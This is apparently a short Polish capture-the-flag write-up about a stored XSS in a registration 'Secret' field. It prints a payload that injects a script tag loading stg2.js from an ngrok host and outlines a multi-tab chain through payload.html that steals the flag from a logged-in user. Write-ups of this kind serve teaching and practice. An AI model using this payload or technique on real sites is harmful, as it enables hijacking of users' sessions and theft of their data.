![](../images/Pasted%20image%2020220717204406.png)

Przy rejestracji jest XSS w polu Secret, który potem jest wyświetlany na `secret.domain.pl/secret`, payload:
```
hello, world!<script src="https://somehost.eu.ngrok.io/stg2.js"></script>
```

Co robi `payload.html`:
 1. Otwiera normalnego taba z zalogowanym użytkownikiem
 2. Loguje się na konto z wyżej wymienionym payloadem
 3. Otwiera kolejne okno z secretem i wykonuje `stg2.js`
 4. Pobiera flagę przez otwarcie taba o tym samym ID

Wszystko zchainowane daje rezultat:
![](../images/Pasted%20image%2020220717205814.png)